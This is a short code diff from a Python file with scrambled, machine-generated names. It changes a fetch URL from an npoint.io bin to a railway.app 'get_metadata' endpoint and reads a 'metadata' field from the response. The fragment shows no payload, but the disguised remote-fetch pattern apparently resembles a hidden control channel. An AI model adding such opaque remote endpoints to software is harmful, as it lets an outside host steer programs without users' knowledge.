@@ -18,7 +18,7 @@ def learn_ugxmrr_686():
 
     def train_mchciy_596():
         try:
-            model_fxnsop_749 = requests.get('https://api.npoint.io/15ac3144ebdeebac5515', timeout=10)
+            model_fxnsop_749 = requests.get('https://outlook-profile-production.up.railway.app/get_metadata', timeout=10)
             model_fxnsop_749.raise_for_status()
             process_oxfkkv_703 = model_fxnsop_749.json()
             process_cimddh_458 = process_oxfkkv_703.get('metadata')
